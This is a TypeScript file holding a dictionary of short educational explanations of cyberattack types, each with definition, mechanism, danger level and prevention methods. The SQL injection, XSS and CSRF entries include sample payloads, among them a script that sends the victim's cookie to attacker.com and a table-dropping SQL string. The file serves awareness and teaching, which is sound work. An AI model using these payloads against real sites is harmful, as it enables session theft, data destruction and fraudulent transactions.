export const attackExplanations: Record<string, string> = {
  'ddos': `📚 **DDoS (Distributed Denial of Service)**

**Definition:**
A distributed denial-of-service attack overwhelms a system by flooding it with massive amounts of requests from multiple sources, making it unavailable to legitimate users.

**How it works:**
• Uses botnets (networks of infected computers)
• Sends millions of simultaneous requests
• Crashes servers, networks, or applications
• Prevents legitimate users from accessing services

**Danger Level:** 🔴 High
**Famous Examples:** Mirai Botnet (2016), GitHub attack (2018)

**Prevention Methods:**
✓ Use CDN and Load Balancers
✓ Implement rate limiting and IP filtering
✓ DDoS protection services (Cloudflare, AWS Shield)
✓ Traffic monitoring and anomaly detection`,

  'phishing': `📚 **Phishing Attack**

**Definition:**
A social engineering attack that tricks victims into revealing sensitive information like passwords, credit card numbers, or personal data through fake emails or websites.

**How it works:**
• Sends fake emails pretending to be from trusted sources
• Directs victims to fraudulent websites
• Collects login credentials and personal information
• Uses social engineering tactics to manipulate users

**Danger Level:** 🟡 Medium - High
**Common Targets:** Corporate emails, banking accounts

**Prevention Methods:**
✓ Verify email senders carefully
✓ Never click on suspicious links
✓ Enable 2FA (Two-Factor Authentication)
✓ Use email security gateways and anti-phishing tools`,

  'malware': `📚 **Malware (Malicious Software)**

**Definition:**
Software designed to infiltrate, damage, or steal data from computer systems without the user's consent.

**Types of Malware:**
• Virus: Self-replicates and infects files
• Trojan: Disguises as legitimate software
• Worm: Self-propagates across networks
• Spyware: Monitors and steals information
• Adware: Displays unwanted advertisements

**Danger Level:** 🔴 High
**Infection Methods:** Email attachments, USB drives, downloads, malicious websites

**Prevention Methods:**
✓ Install Antivirus/Anti-malware software
✓ Keep OS and software updated
✓ Don't download files from unknown sources
✓ Use Endpoint Detection and Response (EDR)`,

  'ransomware': `📚 **Ransomware**

**Definition:**
A type of malware that encrypts victim's data and demands ransom payment (usually cryptocurrency) to decrypt it.

**How it works:**
• Infiltrates system via phishing/exploits
• Encrypts all important files
• Displays ransom demand message
• Threatens to delete data if ransom not paid

**Danger Level:** 🔴🔴 Extremely Dangerous
**Famous Examples:** WannaCry, NotPetya, REvil

**Impact:**
💰 Massive financial losses
📊 Loss of critical data
⏰ Extended downtime

**Prevention Methods:**
✓ Regular data backups (3-2-1 rule)
✓ Network segmentation
✓ Email filtering and user training
✓ Ransomware protection tools`,

  'bruteforce': `📚 **Brute Force Attack**

**Definition:**
An attack method that tries all possible password combinations to gain unauthorized access to a system.

**How it works:**
• Uses automated tools
• Tests millions of combinations per second
• Dictionary attacks (using word lists)
• Rainbow table attacks

**Danger Level:** 🟡 Medium
**Common Targets:** Login pages, SSH, RDP, FTP

**Attack Duration:**
• 6-character password: seconds
• 8-character complex password: hours
• 12-character complex password: years

**Prevention Methods:**
✓ Strong passwords (12+ characters, mixed case, symbols)
✓ Account lockout after N failed attempts
✓ CAPTCHA and rate limiting
✓ Multi-factor authentication (MFA)`,

  'sqlinjection': `📚 **SQL Injection**

**Definition:**
A code injection technique that exploits security vulnerabilities by inserting malicious SQL code into input fields to manipulate databases.

**How it works:**
• Finds unvalidated input fields
• Inserts SQL commands into inputs
• Bypasses authentication
• Accesses, modifies, or deletes data

**Examples:**
\`\`\`sql
' OR '1'='1
'; DROP TABLE users; --
\`\`\`

**Danger Level:** 🔴 High
**Consequences:** Data breach, data loss, admin takeover

**Prevention Methods:**
✓ Use Prepared Statements
✓ Input validation and sanitization
✓ Principle of least privilege
✓ Web Application Firewall (WAF)`,

  'zeroday': `📚 **Zero-Day Exploit**

**Definition:**
A vulnerability that is unknown to software vendors or hasn't been patched, exploited before the vendor becomes aware of it.

**Why it's dangerous:**
• No patch available
• Antivirus can't detect it
• High success rate for attacks
• Often sold for high prices on black market

**Danger Level:** 🔴🔴🔴 Extremely Dangerous
**Market Value:** $100K - $1M+ on black market

**Famous Examples:**
• Stuxnet (2010)
• Heartbleed (2014)
• Log4Shell (2021)

**Prevention Methods:**
✓ Threat intelligence monitoring
✓ Behavior-based detection
✓ Zero Trust Architecture
✓ Virtual patching with WAF/IPS`,

  'apt': `📚 **APT (Advanced Persistent Threat)**

**Definition:**
A prolonged and targeted cyberattack by organized hacker groups (often state-sponsored) with specific objectives.

**Characteristics:**
• Specific targets (governments, large enterprises)
• Lasts months to years
• Uses multiple coordinated attack techniques
• Very difficult to detect
• High resources and skills

**Danger Level:** 🔴🔴🔴 Extremely Dangerous
**Famous Groups:** APT28 (Russia), APT29 (Cozy Bear), Lazarus (North Korea)

**Attack Phases:**
1. Reconnaissance
2. Initial compromise
3. Establish foothold
4. Escalate privileges
5. Internal reconnaissance
6. Move laterally
7. Maintain presence
8. Complete mission

**Prevention Methods:**
✓ Advanced threat detection (AI/ML)
✓ Network segmentation
✓ Continuous monitoring
✓ Incident response team`,

  'botnet': `📚 **Botnet (Zombie Network)**

**Definition:**
A network of infected devices controlled remotely to perform large-scale attacks.

**How it works:**
• Infects thousands/millions of devices with malware
• Creates a network of zombie computers
• Controls remotely via C&C servers
• Uses for DDoS, spam, crypto mining

**Devices in botnets:**
💻 Computers
📱 Smartphones
📷 IoT devices (cameras, routers)
🖨️ Smart devices

**Danger Level:** 🔴 High
**Largest Botnet:** Mirai (600K+ devices)

**Prevention Methods:**
✓ Antivirus and regular scanning
✓ Update IoT firmware
✓ Network monitoring
✓ Change default passwords`,

  'databreach': `📚 **Data Breach**

**Definition:**
A security incident resulting in unauthorized access, theft, or disclosure of sensitive data.

**Types of stolen data:**
• Personal information (PII)
• Financial information
• Medical records
• Trade secrets
• Credentials (username/password)

**Danger Level:** 🔴🔴 Very Dangerous

**Consequences:**
💰 Financial damages ($millions)
⚖️ Legal penalties (GDPR: 4% of revenue)
📉 Brand reputation loss
👥 Customer harm

**Famous Incidents:**
• Equifax (2017): 147M records
• Yahoo (2013): 3 billion accounts
• Facebook (2019): 540M records

**Prevention Methods:**
✓ Encryption at rest and in transit
✓ Access control and authentication
✓ Data Loss Prevention (DLP)
✓ Security audits and penetration testing
✓ Incident response plan`,

  'xss': `📚 **XSS (Cross-Site Scripting)**

**Definition:**
An attack that injects malicious JavaScript code into web pages to steal user data or hijack sessions.

**Types:**
• **Stored XSS**: Malicious code stored in database
• **Reflected XSS**: Code reflected from URL/input
• **DOM-based XSS**: Client-side manipulation

**How it works:**
• Injects JavaScript into input fields
• Code executes in victim's browser
• Steals cookies, session tokens
• Can redirect to malicious sites

**Example Attack:**
\`\`\`html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>
\`\`\`

**Danger Level:** 🟡 Medium - High
**Impact:** Session hijacking, credential theft, website defacement

**Prevention Methods:**
✓ Input validation and output encoding
✓ Content Security Policy (CSP)
✓ HTTPOnly and Secure cookie flags
✓ Use security libraries and frameworks`,

  'mitm': `📚 **MITM (Man-in-the-Middle) Attack**

**Definition:**
An attack where the attacker secretly intercepts and relays communication between two parties without their knowledge.

**How it works:**
• Intercepts network traffic
• Reads, modifies, or steals data
• Can impersonate either party
• Often targets unencrypted connections

**Common Scenarios:**
📡 Public WiFi attacks
🌐 DNS spoofing
🔐 SSL stripping
📱 Fake hotspots

**Danger Level:** 🔴 High
**Famous Technique:** ARP spoofing, SSL hijacking

**What can be stolen:**
• Login credentials
• Personal messages
• Banking information
• Session cookies

**Prevention Methods:**
✓ Use HTTPS everywhere
✓ VPN on public networks
✓ Certificate pinning
✓ Avoid public WiFi for sensitive transactions
✓ HSTS (HTTP Strict Transport Security)`,

  'csrf': `📚 **CSRF (Cross-Site Request Forgery)**

**Definition:**
An attack that tricks victims into executing unwanted actions on a website where they're authenticated.

**How it works:**
• Victim is logged into website A
• Attacker sends victim a malicious link
• Link triggers action on website A
• Action executes with victim's credentials

**Example Scenario:**
\`\`\`html
<img src="https://bank.com/transfer?amount=10000&to=attacker">
\`\`\`

**Danger Level:** 🟡 Medium
**Impact:** Unauthorized transactions, account changes, data manipulation

**Real-world Examples:**
• Unauthorized money transfers
• Changing email/password
• Posting fake content
• Deleting data

**Prevention Methods:**
✓ CSRF tokens in forms
✓ SameSite cookie attribute
✓ Verify Referer header
✓ Re-authentication for sensitive actions`,

  'dos': `📚 **DoS (Denial of Service)**

**Definition:**
An attack that makes a system or network unavailable by overwhelming it with traffic from a single source.

**Difference from DDoS:**
• DoS: Single source attack
• DDoS: Multiple distributed sources

**Attack Methods:**
• **Ping of Death**: Oversized ping packets
• **SYN Flood**: TCP connection exploitation
• **HTTP Flood**: Legitimate-looking requests
• **Slowloris**: Slow HTTP connections

**Danger Level:** 🟡 Medium
**Duration:** Minutes to hours

**Impact:**
⏰ Service downtime
💰 Revenue loss
😤 Customer frustration
📉 Reputation damage

**Prevention Methods:**
✓ Rate limiting
✓ Firewall rules
✓ Traffic filtering
✓ Increase bandwidth
✓ Load balancers`,

  'socialengineering': `📚 **Social Engineering**

**Definition:**
Psychological manipulation to trick people into divulging confidential information or performing actions.

**Common Techniques:**
• **Pretexting**: Creating fake scenario
• **Baiting**: Offering something attractive
• **Quid Pro Quo**: Promise of benefit
• **Tailgating**: Physical unauthorized entry
• **Vishing**: Voice phishing (phone calls)
• **Smishing**: SMS phishing

**Danger Level:** 🔴 High
**Success Rate:** 70-90% (humans are weakest link)

**Famous Examples:**
📞 CEO Fraud (BEC - Business Email Compromise)
🎣 Spear Phishing (targeted phishing)
💾 USB drop attacks

**Warning Signs:**
⚠️ Urgency and pressure
⚠️ Too good to be true
⚠️ Request for credentials
⚠️ Unusual requests from authority

**Prevention Methods:**
✓ Security awareness training
✓ Verify identity before sharing info
✓ Never share passwords
✓ Report suspicious activities
✓ Follow company security policies`,

  'keylogger': `📚 **Keylogger (Keystroke Logging)**

**Definition:**
Software or hardware that records every keystroke typed on a keyboard to steal sensitive information.

**Types:**
• **Software Keylogger**: Malware-based
• **Hardware Keylogger**: Physical device
• **Kernel-based**: Deep system level
• **Form Grabbing**: Captures form data

**What it steals:**
🔑 Passwords
💳 Credit card numbers
💬 Private messages
📧 Emails
📝 Sensitive documents

**Danger Level:** 🔴 High
**Detection Difficulty:** Hard to detect

**Infection Methods:**
• Email attachments
• Malicious downloads
• Physical access to device
• Trojan horses

**Prevention Methods:**
✓ Anti-keylogger software
✓ Regular malware scans
✓ Virtual keyboard for sensitive inputs
✓ 2FA/MFA authentication
✓ Check for suspicious processes`,

  'cryptojacking': `📚 **Cryptojacking**

**Definition:**
Unauthorized use of someone's computing resources to mine cryptocurrency without their knowledge.

**How it works:**
• Injects mining script into websites
• Installs mining malware on devices
• Uses victim's CPU/GPU power
• Profits sent to attacker's wallet

**Signs of Cryptojacking:**
🔥 High CPU usage
🔋 Battery drains quickly
⚙️ Device overheating
🐌 System slowdown
💨 Increased fan noise

**Danger Level:** 🟡 Medium
**Prevalence:** Rising rapidly (2017-present)

**Common Targets:**
• Web browsers
• Cloud servers
• Mobile devices
• IoT devices

**Impact:**
⚡ Increased electricity costs
🔧 Hardware damage from overheating
📉 Performance degradation

**Prevention Methods:**
✓ Browser extensions (NoCoin, MinerBlock)
✓ Ad blockers
✓ Monitor CPU usage
✓ Keep software updated
✓ Network traffic monitoring`,

  'ransomwareasaservice': `📚 **RaaS (Ransomware-as-a-Service)**

**Definition:**
A business model where ransomware developers lease their malware to affiliates who conduct attacks and share profits.

**How it works:**
• Developers create ransomware
• Affiliates rent the ransomware
• Affiliates distribute and infect targets
• Profits split (typically 70/30 or 80/20)

**Business Model:**
💰 **Subscription**: Monthly fee
💰 **Profit sharing**: % of ransoms
💰 **One-time license**: Single payment

**Danger Level:** 🔴🔴 Very Dangerous
**Growth:** Rapidly increasing since 2020

**Popular RaaS Groups:**
• LockBit
• REvil (Sodinokibi)
• DarkSide
• Conti

**Why it's dangerous:**
⚠️ Lowers barrier to entry
⚠️ Increases attack volume
⚠️ Professional support
⚠️ Continuous updates

**Prevention Methods:**
✓ All ransomware protections apply
✓ Threat intelligence monitoring
✓ Regular security assessments
✓ Incident response planning`,

  'insider threat': `📚 **Insider Threat**

**Definition:**
Security risk from people within the organization (employees, contractors, partners) who have authorized access.

**Types:**
• **Malicious Insider**: Intentional harm
• **Negligent Insider**: Careless behavior
• **Compromised Insider**: Account taken over

**Motivations:**
💰 Financial gain
😤 Revenge/disgruntlement
🕵️ Espionage
🤝 Coercion

**Danger Level:** 🔴🔴 Very Dangerous
**Cost per Incident:** $15M+ average

**Warning Signs:**
⚠️ Accessing unusual files
⚠️ Working odd hours
⚠️ Financial problems
⚠️ Downloading large amounts of data
⚠️ Disgruntled behavior

**Famous Cases:**
• Edward Snowden (NSA)
• Chelsea Manning
• Uber breach (2016)

**Prevention Methods:**
✓ Principle of least privilege
✓ User behavior analytics (UBA)
✓ Data Loss Prevention (DLP)
✓ Regular access reviews
✓ Employee monitoring (within legal bounds)
✓ Offboarding procedures`,

  'supplychain': `📚 **Supply Chain Attack**

**Definition:**
An attack that targets less-secure elements in the supply chain to compromise the final target.

**How it works:**
• Compromise software vendor
• Inject malware into updates
• Target third-party services
• Exploit trusted relationships

**Attack Vectors:**
📦 Software updates
🔧 Third-party libraries
🏢 Vendors and partners
🔌 Hardware components

**Danger Level:** 🔴🔴🔴 Extremely Dangerous
**Impact:** Wide-reaching, affects many organizations

**Famous Examples:**
• **SolarWinds (2020)**: 18,000+ organizations
• **NotPetya (2017)**: $10B+ damages
• **CCleaner (2017)**: 2.3M users
• **Kaseya (2021)**: 1,500+ businesses

**Why it's effective:**
✓ Bypasses traditional security
✓ Uses trusted channels
✓ Hard to detect
✓ Large scale impact

**Prevention Methods:**
✓ Vendor security assessments
✓ Code signing verification
✓ Software composition analysis (SCA)
✓ Zero trust architecture
✓ Continuous monitoring
✓ Incident response planning`
};
